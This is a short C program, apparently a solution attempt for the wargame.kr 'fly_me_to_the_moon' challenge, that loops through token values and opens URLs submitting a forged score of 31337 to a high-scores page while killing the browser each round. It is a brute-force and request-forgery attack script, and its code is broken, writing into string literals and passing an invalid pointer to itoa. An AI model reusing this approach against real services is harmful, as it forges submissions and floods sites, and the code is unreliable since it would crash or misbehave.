#include<stdio.h>
#include<stdlib.h>
#include<string.h>

int main(){
    int forceparam;
    int i=1;
    char *s1="explorer \"http://wargame.kr:8080/fly_me_to_the_moon/high-scores.php?token=", *s2;
    char*s3="&score=31337\"";
    while(1){
        forceparam=i;
        i++;
        itoa(forceparam, &s2, 10);
        strcat(s1,s2);
        printf("%s", s1);
        strcat(s1,s3);
        printf("%s", s1);
        system("taskkill /f /im chrome.exe");
        if(i==10000) break;
    }  
}
